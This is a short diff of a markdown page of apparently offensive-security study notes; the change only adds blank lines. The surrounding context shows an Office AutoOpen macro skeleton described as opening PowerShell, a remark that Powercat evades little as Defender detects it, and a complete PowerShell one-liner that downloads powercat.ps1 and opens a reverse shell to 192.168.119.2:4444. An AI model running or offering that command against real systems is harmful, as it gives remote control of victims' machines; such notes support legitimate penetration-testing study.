@@ -20,6 +20,7 @@ layout: blank
 - **MS Office Macros**
 	- To make macros: View -> Macros
 	- Basic macro code that opens powershell:
+	
 ```
 Sub AutoOpen()
 
@@ -37,6 +38,7 @@ Sub MyMacro()
 
 End Sub
 ```
+
 - Powercat
 	- Creates reverse shells, but detected by defender
 	- Command to download/execute the reverse shell: `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`
